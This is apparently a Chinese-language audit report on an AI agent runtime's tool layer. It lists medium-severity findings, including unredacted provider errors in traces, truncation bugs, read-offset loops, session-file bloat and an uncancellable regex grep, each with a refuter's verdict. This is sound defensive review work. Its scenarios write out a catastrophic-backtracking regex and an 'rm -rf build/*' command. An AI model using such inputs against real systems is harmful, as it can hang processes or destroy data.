# 审计发现：medium 级（49 条，含部分取舍）

Role: evidence（source material，原文保留）；来源：2026-09-14 只读审计（工作流 wf_35ec4283-35d，92 个子代理）。严重级取反驳者判定；按区域顺序排列。

每条发现的格式：`[编号] 严重级 类别 最终状态 | 节点 | 文件:行 | 标题`，随后是审查员描述（DESC）、引用代码（EVIDENCE）、失败场景（SCENARIO）、修法建议（FIX）、反驳者结论（REFUTER）与文档取舍核对（WAIVER）。最终状态：confirmed=反驳者确认且无取舍；confirmed-partial-waiver=确认但文档部分取舍；uncertain=无法构造触发路径也无法排除；refuted=被推翻；waived=文档明确取舍、不计入。

### [core-host-03] MEDIUM security confirmed | P0-6 | src/runtime/plugins/agent-loop/index.ts:406 | provider 原始错误正文未脱敏、未截断就写进 trace 文件与 run 结果
DESC: trace 的 llm 步骤直接把 pi 的 `turn.errorMessage` 原样写进去；同一个字符串还经 resolveError（同文件 506 行）变成 RuntimeRunResult.error.message 和 trace.error.message，最终落进 runs.jsonl 并回传 GUI。

这个字符串是 pi-ai 的 formatProviderError 产物：src/runtime/node_modules/@earendil-works/pi-ai/dist/utils/error-body.js 的 MAX_PROVIDER_ERROR_BODY_CHARS = 4000，会把 SDK error 的 `body` / `error` 字段（HTTP 响应正文）整段拼进去，Anthropic 分支（anthropic-messages.js:599）更是直接用 `error.message` 或 `JSON.stringify(error)`。

同一个仓库里已经有正确做法：providerErrors.ts:118 的 classifyProviderFailure 会跑 redactSensitiveErrorText（脱掉 `authorization: bearer …`、`api_key`/`access_token`/`password`，并清掉控制字符）并截到 600 字符，重试记账那条 note 走的就是这条路。llm 那条 note 绕开了它。

P0 的验收写着「凭据与 baseUrl 不进入 trace 文件（已核对 trace 既无 key 也无网关地址）」——那次核对是在一次成功的冒烟样本上做的，覆盖不到失败分支。
EVIDENCE:       trace.note('llm', {
        stop_reason: turn.stopReason,
        text_bytes: Buffer.byteLength(turn.text, 'utf8'),
        usage: turn.usage,
        ...(turn.errorMessage ? { error_message: turn.errorMessage } : {}),
      });
SCENARIO: 网关对一次 401/403 回一段把请求头原样回显的 JSON 正文（企业网关常见）。pi-ai 把这段 body 折进 errorMessage，本行原样写进 <traceDir>/runs.jsonl（0600，但明文留盘）并回传渲染层；重试那条 note 里同一段文本是脱敏的，llm 这条不是。同理，正文里若带网关主机名，也就进了 trace。
FIX: 让 error_message 与 resolveError 的 message 都过 providerErrors.ts 已有的脱敏与 600 字符截断（把 redactSensitiveErrorText 导出复用），并补一条用含 `Authorization: Bearer sk-…` 的假 errorMessage 断言 trace 里是 [REDACTED] 的测试。
REFUTER(CONFIRMED,medium): 代码路径完整核实：agent-loop/index.ts:402-408 的 `trace.note('llm', { ... error_message: turn.errorMessage })` 原样写入，且 resolveError（同文件 501-505）把 `input.last.errorMessage` 直接当作 RuntimeRunResult.error.message，两者都进 trace.ts:127 的 runs.jsonl 落盘并回传调用方。上游确实会把 HTTP 响应正文折进这个字符串：pi-ai 的 dist/api/openai-responses.js:4,67 用 `formatProviderError(normalizeProviderError(error))`，而 dist/utils/error-body.js 的 `MAX_PROVIDER_ERROR_BODY_CHARS = 4000` 且 extractBody 会取 SDK 的 `body`/`error` 字段；Anthropic 分支 dist/api/anthropic-messages.js:598 是 `output.errorMessage = error instanceof Error ? error.message : JSON.stringify(error)`。

我额外发现原报告的对照论证其实站不住，但结论反而更强：providerRetry 的 onRetry 记账（agent-loop/index.ts:192-199）只写 code/attempt/delay_ms/details，根本不写 message，所以并不是「重试那条走了脱敏路」；而且 providerRetry.ts:388-392 转发给上层的是未经处理的 `event.error`，classifyProviderFailure 产出的那个已脱敏 600 字截断的 message（providerErrors.ts:115-121）在生产路径上没有任何消费者，只在测试里被断言。也就是说仓库里那套脱敏是事实上的死代码，唯一进 trace 的 provider 文本是未脱敏未截断的那份。

无法推翻。维持 medium：泄露需要网关回显敏感头这一前置条件（未在本仓证据中观察到），但 4000 字正文明文落盘 + 回传渲染层是确定行为，且与 P0 验收所称「凭据不进 trace」冲突。
WAIVER(no): 无 — P0 相关 waiver 仅有两条（重试延迟、baseUrl 配置留待 P5-5），均未提及错误正文脱敏问题；P0 验收记录的核对只针对成功冒烟样本，文档没有明确声明「失败分支的 provider 错误正文不脱敏是可接受的」，因此该缺陷未被豁免。

### [tools-02] MEDIUM contract-gap confirmed | P1-2 | src/runtime/plugins/tools/index.ts:541 | grep/glob 无命中与 read 空文件返回空文本块，参考实现明确避免这一形状
DESC: result() 对空字符串不做任何替换，于是三条常见路径会产出 content: [{type:'text', text:''}]：grep 零命中（541 行 matches.join 为空且 truncated 为 false）、glob 零命中（436 行）、read 读空文件。pi-agent-core 的 createToolResultMessage 原样带上 content，pi-ai 的 anthropic-messages 适配器把纯文本块 join 成字符串，因此发给 Anthropic 的 tool_result.content 是空串。本仓 legacy 后端用的 pi-coding-agent 对同样场景显式返回占位文本（dist/core/tools/grep.js:239 的 "No matches found"、find.js:130 的 "No files found matching pattern"），Anthropic 官方 SDK 也在 SessionToolRunner.ts:863 把空文本替换成 "(no output)"——两个参考实现都专门绕开这个形状。除协议风险外，还有一个必然发生的问题：模型无法把「搜过了，没有」和「工具啥也没干」区分开，时间线上 tool.completed 的 output 也是空串。
EVIDENCE:         return result(
          matches.join('\n') + (budget.truncated ? '\n[search truncated; narrow the search]' : ''),
          {
            truncated: budget.truncated,
            skipped,
            visited: budget.visited,
          }
        );
SCENARIO: 模型调用 grep {pattern:'refreshToken'}，仓库里没有该字符串。工具成功返回，但 content 是空文本块；随后这条 toolResult 进入下一次 provider 请求。对 anthropic-messages 线路，tool_result 内容为空串（参考实现为此专门加了占位文本）；即使协议放行，模型看到的是一个没有任何文字的成功结果，通常会重试同一次搜索或改写查询，而不是得出「没有命中」的结论。tools.test.ts:415 正是断言这个空串（not.toContain），所以现有测试反而把该形状钉住了。
FIX: 在 result() 里对空文本兜底，或在三个工具各自返回处给出显式措辞（如 grep 的 'No matches found.'、glob 的 'No files matched.'、read 的 '(empty file)'），与 legacy 后端对齐。
REFUTER(CONFIRMED,medium): 「空文本块」这一形状我在代码里完整走通了：result()（index.ts:553-558）对空串不做任何兜底；grep 零命中（index.ts:541-542，matches 为空且 truncated 为 false）、glob 零命中（index.ts:436-438）、read 空文件（read-lines.ts:39-50 首个 chunk 为 0 字节即返回 text:''）都会产出 content:[{type:'text',text:''}]。下游我也核到了尽头：pi-agent-core 的 createToolResultMessage（agent-loop.js:532-545）原样带上 content；pi-ai 的 anthropic-messages 在 convertToolResult（anthropic-messages.js:836-863）里调 convertContentBlocks，而后者（同文件 78-83 行）在没有图片时把纯文本块 join('\n')，于是 tool_result.content 就是空串。报告引用的两个参考实现也逐字属实：pi-coding-agent 的 grep.js:239 是 "No matches found"、find.js:130/241 是 "No files found matching pattern"，Anthropic SDK 的 SessionToolRunner.ts:863/865/884 确实把空文本换成 '(no output)'。我推翻不了这条，但要削两处：(1)「协议会被拒」这半我无法证实——禁止联网/执行，pi-ai 侧也没有对空串的校验，所以后果可能只是模型看不到文字而非 400；(2) 报告说 tools.test.ts:415 「把该形状钉住了」不准确，那行是 not.toContain('hidden')，换成 'No matches found.' 一样能通过，它并没有锁住空串。综合：形状与分歧确凿、后果分档不确定，维持 medium。
WAIVER(no): 无 — 查遍 P1-2 相关 waiver（真实加密文本 Main 侧样本归 P4-6；不宣称跨进程事务/symlink TOCTOU 的 OS 沙箱能力）以及 P1 README「接口及兼容范围」段落，均未提及 grep/glob 零命中或 read 空文件时返回值的形状问题。文档反而写「模型可见描述与这些行为一致」，暗示结果应当是可判读的，没有对「返回空文本块」这一具体缺陷做出取舍声明。

### [tools-03] MEDIUM boundary confirmed | P1-2 | src/runtime/plugins/tools/index.ts:556 | result() 的 50 KiB 截断把各工具自己拼在末尾的状态尾巴切掉（read 的续读行号、bash 的退出码）
DESC: read、bash、grep 都把状态尾巴（[truncated; next line=N]、[exit=...; termination]、[search truncated...]）拼在正文之后再交给 result()，而 result() 用同一个 TOOL_OUTPUT_BYTES=50 KiB 做二次截断，且从头部保留。正文本身已经按 50 KiB 预算填满（readLines 的 accept 精确裁到 maxBytes；exec 的 retained 精确裁到 maxOutputBytes），所以只要正文顶到上限，尾巴必然落在截断线之外，被换成一句没有信息量的 [output truncated]。details 里还有 nextOffset / exitCode，但模型只读 content。这直接与 P1 证据文档「Read 输出 50 KiB... 单行超限会明确提示」和 read 工具描述里的 "Use nextOffset to continue" 冲突。
EVIDENCE: function result(text: string, details: unknown): AgentToolResult<unknown> {
  const bytes = Buffer.from(text);
  if (bytes.length > TOOL_OUTPUT_BYTES)
    text = `${decodeUtf8(bytes.subarray(0, TOOL_OUTPUT_BYTES), true).text}\n[output truncated]`;
  return { content: [{ type: 'text', text }], details };
}
SCENARIO: 用 tools.test.ts:394 的同一份 fixture：2200 行、每行 89 字节的 archive 文件，调用 read {path:'archive'}。第 575 行结束时 used=51175，第 576 行需要 89 字节超预算，被裁到 25 字节，正文正好 51200 字节，nextOffset=576。拼上 "\n[truncated; next line=576; single line exceeds byte budget]"（58 字节）后共 51258 > 51200，result() 砍回 51200 并追加 [output truncated]——模型看不到 576 这个续读行号。bash 侧同理：任何产出 50 KiB 以上的命令（如 npm run build），模型拿不到 [exit=0]，无法判断命令成功还是失败。
FIX: 先给尾巴留出预算：把正文裁到 TOOL_OUTPUT_BYTES - Buffer.byteLength(suffix) 再拼接，或让 result() 接受一个「必须保留」的后缀参数，截断时从正文中间或头部裁而保留尾部。
REFUTER(CONFIRMED,medium): 两条链路都核实了。read 侧：readLines 的 accept（read-lines.ts:21-36）保证 used 恒不超过 maxBytes，且溢出分支把被裁片段精确填到 maxBytes-used，所以「字节预算打满」时 data.text 正好等于 TOOL_OUTPUT_BYTES（51200，ASCII 下 stream:true 不丢字节）；index.ts:248-254 再把 '\n[truncated; next line=N...]'（约 50-58 字节）拼上去，总长必然 > 51200，于是 result()（553-558）从头部裁回 51200 并追加 '[output truncated]'，续读行号被切掉。报告给的 2200 行算例里「575 行 / used=51175」这些数字不对（行长随行号位数变化，真实溢出点在 563 行附近），但结论不受影响。bash 侧更硬：exec 的 consume（src/runtime/host/exec.ts:454-463）用的是 stdout+stderr 合计的 retained 预算，maxOutputBytes 即 TOOL_OUTPUT_BYTES，所以只要命令产出 ≥50 KiB，index.ts:399-402 拼的 '[exit=...; termination]' 必被 result() 切掉。也核实了不会被别处补救：details 里虽有 nextOffset/exitCode，但模型只读 content；现有测试 tools.test.ts:393-405 只断言 details.truncated，正好绕开了这个尾巴。另外 P1 证据文档 docs/plantree/plans/runtime-evolution/evidence/p1/README.md:54 确实写着「Read 输出 50 KiB…单行超限会明确提示」，与实际被切掉相冲突；系统提示词里还专门教模型「follow the reported next line after truncation」（见 p2-5 证据 trace 的 systemPrompt），使这条更贴切。注意 count>=limit 的截断路径（read-lines.ts:60/78/89）正文没顶满预算，尾巴能活下来，所以问题只发生在字节预算打满时——但那恰恰是最需要尾巴的场景。
WAIVER(no): 无 — P1 README 明确写「Read 输出 50 KiB...单行超限会明确提示，不伪造完整行」，这是一条正面承诺而非豁免；tools-03 指出的正是该承诺在 bash/grep/read 三处因二次截断而未兑现（提示尾巴被切掉）。没有任何 waiver 条目豁免「状态尾巴被截断丢失」这一具体行为，属于文档承诺与代码实现不一致的缺陷，未被豁免。

### [tools-04] MEDIUM boundary confirmed | P1-2 | src/runtime/plugins/tools/read-lines.ts:73 | 单行超过 50 KiB 时 nextOffset 指回同一行，read 永远读不到该行之后的内容
DESC: 当一行的字节数超过输出预算（50 KiB）且该行编号已达到 offset 时，readLines 走 72-73 行：accept(pending) 把该行裁到预算并返回 false，然后返回 nextOffset: line - 1。accept 内部已经做过 line++，所以 line - 1 正是这条被裁断的行本身。也就是说续读提示指向的是刚刚读过的同一行，模型按提示再读一次会拿到字节完全相同的内容，形成死循环；该行之后的内容通过 read 工具永远取不到（换 limit 也没用，预算是字节而不是行）。63-64 行那条 return 的 nextOffset 语义是对的（那里 accept 是在完整行上失败的，line-1 指向这条没读完的行，重读是正确语义），但 72-73 行这条在「整行都放不下」时把同一个语义复用，就变成了不前进。这一条还会与 tools-03 叠加：解释文字 single line exceeds byte budget 恰好在这种情况下被 result() 切掉，模型连「为什么不前进」都看不到。
EVIDENCE:     if (Buffer.byteLength(pending) > maxBytes) {
      if (line < offset) {
        pending = '';
        skippingLongLine = true;
      } else {
        accept(pending);
        return { text: output.join(''), truncated: true, nextOffset: line - 1, partialLine: true };
      }
    }
SCENARIO: 工作区里有一个压缩后的单行文件（minified bundle 或单行 JSON，常见于 dist/ 与 lock 文件），第 1 行长 200 KB。模型调用 read {path:'dist/app.min.js'}：拿到前 50 KiB，提示 next line=1；按提示再调 read {offset:1} 拿到一模一样的 50 KiB。无论重试多少次都停在同一处，模型要么无限重试要么放弃，且没有任何其他参数能让它往后走。
FIX: 该分支应返回 nextOffset: line（跳过这条读不完的行）并在提示中说明本行被截断且不会续上，或者给 readLines 增加字节级续读入口（把 position 一并回报），让下一次调用从字节偏移继续。
REFUTER(CONFIRMED,medium): 逻辑逐行对过：accept（read-lines.ts:21-22）是 `if (line++ < offset)`，即先比较后自增，所以走到 72 行 accept(pending) 时 line 会从 N 变成 N+1，73 行返回的 nextOffset = line-1 = N，正是刚被裁断的那一行本身；read 工具（index.ts:248-252）把它渲染成 '[truncated; next line=N...]'。再按 offset=N 调一次：第 67 行条件仍是「整段 pending > maxBytes」（比的是完整预算而非剩余预算），line(N) 不小于 offset(N)，于是再次裁到同一处返回同一个 N——确实不前进。对照 63-64 行那条我也确认了报告的说法成立：那里 accept 是在一条完整行上因 used 累积而失败，重读时 used 归零、该行能装下，所以会前进。要削一处：报告说「该行之后的内容通过 read 工具永远取不到」不成立——若调用方自己把 offset 设成 N+1，67-70 行的 skippingLongLine 分支会跳过这条超长行并从 N+1 继续（read-lines.ts:47-56 消费掉换行后复位）。所以真实后果是「工具自报的续读点是错的、会原地打转」，不是「数据不可达」。系统提示词明确教模型 follow the reported next line，所以打转的概率不低，维持 medium。
WAIVER(no): 无 — 同样对照 P1 README「单行超限会明确提示，不伪造完整行」的承诺，该承诺意味着读取应可续进，而不是文档中拿「未支持某能力」做出的取舍声明。tools-04 描述的是 nextOffset 在整行超预算时指回同一行造成死循环，这是一个纯粹的实现缺陷，没有任何 waiver（含 P1-2 相关豁免）覆盖「单行超限续读失效」这一具体故障模式。

### [tools-06] MEDIUM resource-leak confirmed | P1-3 | src/runtime/plugins/tools/index.ts:401 | bash 把整个 RuntimeExecResult 当 details 上交，Uint8Array 被 JSON 序列化成逐字节键值对写进会话 JSONL 与 trace
DESC: bash 的 result(..., output) 直接把 RuntimeExecResult 作为 details 传出，其中 stdout / stderr 是 Uint8Array。这个 details 经 pi-agent-core 的 createToolResultMessage（agent-loop.js:539-540）挂到 toolResult 消息上，agent-loop/index.ts:262 在 message_end 时 session.appendMessage(event.message)，store.ts:243 用 JSON.stringify 写进 JSONL。JSON.stringify 对 Uint8Array 产出 {"0":104,"1":101,...} 这种逐字节对象，约 11 到 12 个字符换 1 个字节。同一份数据还被 agent-loop/index.ts:275 的 trace.note('tool', { result: event.result }) 写进 trace 文件。重新打开会话时 codec 把它读回成普通对象（不再是 Uint8Array），形状也不可逆。read 工具有同类但轻得多的问题：details 里的 ...data 包含完整 text，与 content 重复一份。
EVIDENCE:         return result(
          `${Buffer.from(output.stdout).toString('utf8')}${output.stderr.length ? `\n[stderr]\n${Buffer.from(output.stderr).toString('utf8')}` : ''}\n[exit=${output.exitCode}; ${output.termination}${output.truncated ? '; output truncated' : ''}]`,
          output
        );
SCENARIO: 模型跑一次 pnpm test，输出顶到 50 KiB 上限。这一条 bash 工具结果在会话 JSONL 里写出约 600 KB 的 {"0":...} 文本（正文本身只占 50 KB），trace 文件再写一份。一个会话里几十次 bash 调用就把会话文件推到几十 MB，重开会话时要全量解析这些逐字节对象，Main 侧的索引与 IPC 也跟着搬运同样的体积。
FIX: details 只放标量与派生字段（exitCode、signal、termination、stdoutBytes、stderrBytes、truncated），或把 stdout/stderr 先转成字符串再放入 details；read 的 details 去掉与 content 重复的 text。
REFUTER(CONFIRMED,medium): 整条链路我逐段核实且比报告更糟一点。RuntimeExecResult 的 stdout/stderr 在 contracts.ts:404-413 声明为 Uint8Array，实际由 exec.ts 的 snapshot()（381-385）Buffer.concat 产生；index.ts:399-402 把整个 output 当 details 上交；pi-agent-core 的 createToolResultMessage（agent-loop.js:532-545）原样挂上 details；我们的 agent-loop 订阅器（src/runtime/plugins/agent-loop/index.ts:262）在 message_end 调 session.appendMessage；store.ts:208-209 与 233-234 连做两次 structuredClone——这一步恰恰是关键：structuredClone 会把 Node Buffer 降级成普通 Uint8Array，Buffer.prototype.toJSON 随之失效，于是 store.ts:243 的 JSON.stringify 产出的正是 {"0":104,...} 这种逐字节键值对（约 11 字符换 1 字节），报告的估算成立。还有两点补充：(1) 会话有 32 MiB 硬上限（store.ts:101、245），一旦累积越界 appendEntry 直接抛 session_size_limit，后果不止是「文件大」而是会话写不进去；(2) trace 侧（agent-loop/index.ts:274-281 → trace.ts:126 的 JSON.stringify(trace)）持有的仍是原始 Buffer，走 toJSON 得到 {"type":"Buffer","data":[...]}，约 4-5 字符换 1 字节，比报告说的 11-12 轻，但同时意味着整个 run 期间这些 Buffer 都被 steps 数组强引用在内存里。read 的 details 重复 text 一份（index.ts:253）也属实。维持 medium。
WAIVER(no): 无 — D11 中「子进程普通 stdout 必须排空，RPC 走独立通道」和「bash 类工具不得假设管道 stdio 一定可用」都是关于子进程 IO 通道设计的决策，并未涉及工具结果 details 中 Uint8Array 字段被 JSON.stringify 逐字节序列化、导致会话 JSONL/trace 文件体积膨胀这一具体问题。查遍 P1-3 全部 waiver（可选 R4 探针、Windows bash.exe 白名单等），均与此无关，属于未被文档提及、也未被豁免的代码缺陷。

### [tools-07] MEDIUM bug confirmed | P1-3 | src/runtime/plugins/tools/index.ts:193 | 通配符父目录不存在时，bash 在执行前就以裸 ENOENT 失败，而不是让 shell 自己报错
DESC: checkShellPaths 的 expand() 在确认父目录没有被 deny 之后，直接 for await io.readDirectory(parent) 枚举条目。HostIoPlugin.readDirectory 内部是 opendir(path)，父目录不存在抛 ENOENT、父目录其实是个文件抛 ENOTDIR，异常没有被捕获，直接把整次 bash 工具调用打掉。也就是说权限预检把「路径还不存在」当成了错误，而 shell 本身对一个匹配不到任何东西的 glob 是正常行为（原样传递或空展开）。抛出的是裸 fs 错误，不带 RuntimeHostError 的 code，模型看到的是 opendir 的系统错误。
EVIDENCE:       const parent = parts.slice(0, wildcard).join(sep) || sep;
      await check(parent);
      // Even an unmatched pattern can target denied names after another command creates them.
      if (pathPolicy(path) === 'deny')
        throw new RuntimeHostError('tool_denied', `shell pattern is denied: ${path}`);
      for await (const entry of this.ctx.runtimeHostIo.readDirectory(parent)) {
SCENARIO: 工作区里还没有 build/ 目录，模型调用 bash {command:'rm -rf build/*'} 或 bash {command:'cat logs/*.log'}。analysis.paths 里有 <cwd>/build/*，expand 取父目录 <cwd>/build，readDirectory 抛 ENOENT，工具调用在执行前失败，错误文本是 "ENOENT: no such file or directory, opendir '/.../build'"。模型无法从该错误判断是权限问题还是路径问题，且这条命令在真 shell 下本来是可以正常跑完的。
FIX: 把 readDirectory 的枚举包在 try/catch 中，ENOENT/ENOTDIR/EACCES 时按「该模式没有展开结果」处理（保留已做的 deny 判定），不要中断工具调用。
REFUTER(CONFIRMED,medium): 引用与顺序都对得上：index.ts:184-203 的 expand 里，先 check(parent)（其中 canonicalPath 在 paths.ts:13-19 专门吞掉 ENOENT 并向上回溯，所以父目录不存在时不会在这一步报错），紧接着第 193 行就 for await io.readDirectory(parent)，而 HostIoPlugin.readDirectory（host/io.ts:177-181）是直接 opendir，目录不存在抛 ENOENT、父路径是文件抛 ENOTDIR，全程无 try/catch；checkShellPaths 的调用点（index.ts:204、371）也没有捕获，所以 bash 在「请求审批之前」就整次失败，错误文案是裸 opendir 的系统错误（经 pi-agent-core 的 createErrorToolResult 原样转给模型）。触发前提我也验证过：BashAnalyzer 的 addPath（bash-analysis.ts:115-124）注释就写着「Keep wildcard's static parent; glob expansion is handled by the caller」，确实会把 <cwd>/build/* 这类带通配符的整串放进 analysis.paths，交给 expand 去枚举。现有测试没有任何带通配符的 bash 用例（tools.test.ts 全文搜不到 command 里含 * 的），也没有目录不存在的场景。唯一我没能从代码证明的是 tree-sitter-bash 把 build/* 解析成单个 word 节点（需要跑解析器，本任务禁止执行），但这是该语法的常规行为，且即便退化成 concatenation，路径也只是变成 unresolvedPaths 而非绕开这一行。维持 medium。
WAIVER(no): 无 — P1 README 对原生 bash 的描述强调「该检查不是 OS 沙箱，也不把任意程序内部的动态 IO 宣称为已完整解析；真实项目兼容归 P4」，这豁免的是「解释器脚本内部动态 IO 无法静态解析」的场景，而 tools-07 描述的是权限预检阶段对通配符父目录调用 readDirectory 时，父目录尚不存在就抛出裸 ENOENT 导致整次命令执行前失败——这是预检逻辑本身的健壮性缺陷，不属于「动态 IO 解析不完整」的既有豁免范围，未见任何条目覆盖。

### [tools-08] MEDIUM contract-gap confirmed | P1-4 | src/runtime/plugins/tools/index.ts:509 | grep 的 include 与 glob 的 pattern 都按相对路径整体匹配，*.ts 这类写法在子目录下静默零命中
DESC: grep 的 include（509 行）和 glob 的 pattern（430 行）都用 matchesGlob(relative(root, file), ...)。Node 的 matchesGlob 沿用 minimatch 语义，单个 * 不跨 /，因此 include:'*.ts' 只能匹配根目录直下的文件，src/a.ts 不会命中。生态里同名参数（ripgrep 的 -g、多数 agent 的 include）是按 basename 在任意深度匹配的，模型几乎一定会写 '*.ts'。失败方式是静默的：没有错误、没有诊断，只是返回零命中，与「这个仓库里确实没有」无法区分。工具描述也没有说明 pattern/include 是拿相对路径整体去比的。另有一个相关边界：当 path 指向单个文件时 walk 直接 yield root，relative(root, root) 为空串，与任何 include/pattern 都不匹配，于是 grep {path:'a.ts', include:'*.ts'} 和 glob {path:'a.ts', pattern:'*'} 永远是空结果。
EVIDENCE:           if (args.include && !matchesGlob(relative(root, file), args.include)) continue;
          if (pathPolicy(file) !== 'allow') {
            skipped++;
            continue;
          }
SCENARIO: 模型在一个标准仓库里调用 grep {pattern:'useEffect', include:'*.tsx'}，期望搜所有 tsx。实际 relative(root, file) 形如 'src/components/Chat.tsx'，与 '*.tsx' 不匹配，全部被 continue 掉，返回空结果且 skipped=0、truncated=false。模型据此得出「代码里没有 useEffect」的错误结论并继续往下做。
FIX: include/pattern 匹配时同时尝试 basename 与相对路径（或在 pattern 不含 / 时自动前缀 '**/'），并把这条规则写进两个工具的 description。
REFUTER(CONFIRMED,medium): 主张的核心是「include/pattern 拿 relative(root,file) 整体去比」，这在 index.ts:430 与 509 逐字属实，而同一文件第 200 行 matchesGlob(entry.name, parts[wildcard]) 的按段匹配写法，正说明作者清楚 * 不跨 / ——两处语义是自洽的 glob 标准行为，只是没写进工具描述（grep 的 description 在 index.ts:450-451，对 include 只字未提）。我本想以「这是标准 glob 语义、不算缺陷」来反驳，但生态对照把这条坐实了：本仓 legacy 后端的 grep 直接把参数透传给 ripgrep 的 --glob（node_modules/@earendil-works/pi-coding-agent/dist/core/tools/grep.js:145-147），其参数描述原文就举例 '*.ts'，而 ripgrep 的 gitignore 式 glob 对不含 / 的模式是按任意深度匹配的。也就是说同一产品的两个后端对同一个参数给出相反结果，且 native 侧失败是静默零命中（skipped=0、truncated=false，与「确实没有」不可区分）。因此我认可 CONFIRMED、维持 medium。附带的子主张（path 指向单文件时 walk 直接 yield root，relative(root,root)==='' 与任何 pattern 都不匹配）在代码上前半段成立（index.ts:576-579），但 matchesGlob('', '*') 的返回值我无法在不执行 node 的前提下确认，这一小段判为 UNCERTAIN，不影响主结论。
WAIVER(no): 无 — P1 README 中「Grep 首版明确为字面文本搜索...没有正则语义、gitignore 引擎或 spill 文件」这条 waiver（也是已提取的 P1-4 waiver）豁免的是「搜索模式（content pattern）不支持正则、不解析 gitignore」，针对的是内容匹配语义，而 tools-08 描述的是 include/pattern 参数（文件路径过滤）在子目录下因单个 * 不跨 / 而静默零命中，是路径匹配深度的问题，与「content 是否支持正则」是两回事，未被现有豁免覆盖，也没有其他文档条目提及此问题。

### [tools-09] MEDIUM race confirmed | P1-4 | src/runtime/plugins/tools/index.ts:530 | grep 的逐行正则匹配没有取消点也没有时间预算，模型给出回溯爆炸的 regex 会把 worker 卡死
DESC: P5-2-3 给 grep 加了 regex:true，pattern 直接交给 new RegExp 且完全由模型撰写。匹配循环（530-535 行）对每个文件最多约 1 MiB 的内容逐行 expression.test(line)，循环体里没有 signal?.throwIfAborted()，也没有单文件或单行的时间上限。JS 正则执行不可中断：一旦命中灾难性回溯，用户点 Stop 触发的 AbortSignal 在同步的 test() 返回之前根本没有机会被检查，整个 runtime worker（包含同进程的子代理与会话写入）一起卡住，只能杀进程。walk 层虽有 throwIfAborted，但那是在下一个文件之前，救不了卡在当前行的 test()。
EVIDENCE:           const lines = Buffer.from(data.bytes).toString('utf8').split('\n');
          for (let line = 0; line < lines.length; line++) {
            if (hits(lines[line])) {
              matches.push(`${file}:${line + 1}:${lines[line].slice(0, 2048)}`);
              if (matches.length >= (args.limit ?? 100)) break;
            }
          }
SCENARIO: 模型调用 grep {pattern:'(\\s*\\w+)+$', regex:true} 在含有长行（压缩后的 js、长日志行）的工作区里搜索。第一条长行就触发指数级回溯，test() 不返回；用户点 Stop 无效，权限卡、子代理事件与会话追加全部停摆，只能重启 worker。
FIX: 在每行或每 N 行插入 signal?.throwIfAborted()；对正则路径加单文件挂钟预算（超时即中止并在结果里说明）；或对超长行先截到可控长度再匹配。
REFUTER(CONFIRMED,medium): 代码核对逐条成立：index.ts:485-496 用模型给的 pattern 直接 new RegExp（只捕获语法错误，不做复杂度限制），index.ts:497-500 的 hits() 同步执行 expression.test(line)，index.ts:529-535 的逐行循环里确实没有任何 signal?.throwIfAborted() 与时间预算；唯一的取消点在 walk()（index.ts:582、586），只在切换目录/文件时生效，救不了卡在一行 test() 里的情况。上游也没有防线：二进制跳过只看 NUL 字节（index.ts:525），压缩后的 js/长日志行不含 NUL，单行可长达 1 MiB（SEARCH_FILE_BYTES）。运行位置放大了后果——runtime 跑在 Electron utilityProcess（src/main/services/agent-host/PiWorkerProcess.ts:94）里，JS 主线程被同步正则占死后，该进程内的会话写入、权限应答、子代理全部停摆；主进程侧只有 RPC 超时会 reject（WorkerSlot.ts:424-434），并不会自动杀掉挂死进程，只能走 slot 替换/强杀。唯一不确定的是模型是否真会写出灾难性回溯的 pattern，这属于概率而非代码防护，所以缺陷本身成立。我把严重级维持 medium：后果是进程级挂死，但触发依赖模型自己产出病态正则。
WAIVER(no): docs/plantree/plans/runtime-evolution/evidence/p5-2/README.md 与参考的差异表「grep」行：仅说明「新增 regex:true，默认仍字面，理由是改默认会让已有调用的含义静默变化」；docs/plantree/plans/runtime-evolution/README.md P1-4 行「首版字面 grep，无正则/gitignore 引擎承诺」是针对未加正则前的原始范围声明 — P1-4 的既有豁免只承诺『不做正则/gitignore 引擎』，但 P5-2-3 已实际给 grep 加上了 regex:true 选项；文档只解释了为何默认值不变（避免语义静默变化），完全没有提及正则匹配循环缺取消点、可能被灾难性回溯卡死 worker 这一后果。P5-2-0 记录的『取消不是当场生效的』说的是 abort 信号收到后循环要等一轮 provider 往返才收敛（异步延迟），不是『同步阻塞到进程被杀之前完全无法响应』这种更严重的失效模式，两者不是一回事，不能用来覆盖本条。

### [tools-10] MEDIUM resource-leak confirmed | P1-2 | src/runtime/plugins/tools/read-lines.ts:39 | readLines 按 32 KiB 逐块重复调用 io.readFile，加密文件下每块都要重新拉起一次 TSD helper 子进程并从文件头重读
DESC: readLines 的扫描循环每轮调用一次 io.readFile（39 行），最多可到 64 MiB / 32 KiB = 2048 次。HostIoPlugin.readFile 每次都重新 stat、open、探 TSD 头；一旦命中 TSD 头就 runtimeExec.run 拉起一次 tsd-read.mjs 子进程（io.ts:122）。而 tsd-read.mjs 是顺序读的：它用 file.read(..., null) 从文件开头一路读、丢弃 offset 之前的字节（host/tsd-read.mjs:38-42）。因此对加密文件，读第 k 块要经解密驱动重读 k 乘 32 KiB，整次 read 的驱动读取量是 O(n²)，外加每块一次进程创建、每块各自 30 s 超时。P1-0 的验收口径写的是「命中 TSD 头后仅允许一次经 runtimeExec 的回落读取」，那是按 readFile 计的；按一次 read 工具调用计，上限是 2048 次。
EVIDENCE:   while (position < 64 * 1024 * 1024) {
    signal?.throwIfAborted();
    const chunk = await io.readFile(path, {
      offset: position,
      maxBytes: 32 * 1024,
      overflow: 'truncate',
      signal,
    });
SCENARIO: 加密机上模型对一个 4 MB 的受保护日志执行 read {path:'app.log', offset: 20000}（跳过前 2 万行）。readLines 需要扫过前 20000 行才能开始输出，约 128 个 32 KiB 块，即 128 次 node 子进程启动，累计经解密驱动读取约 128 乘平均 2 MB 约 256 MB。单次 read 工具调用耗时从毫秒级变成数十秒，还有 128 次进程创建落在企业安全软件的监控上。明文机上该问题只表现为 128 次多余的 open/stat，不易察觉，所以本机测试发现不了。
FIX: 给 readLines 一条「一次拿到较大窗口」的路径（例如按 maxBytes 预算一次性读，或让 HostIo 暴露一个可复用句柄或流式读取接口），至少在检测到 source === 'node-fallback' 时把块大小提高到与输出预算同量级。
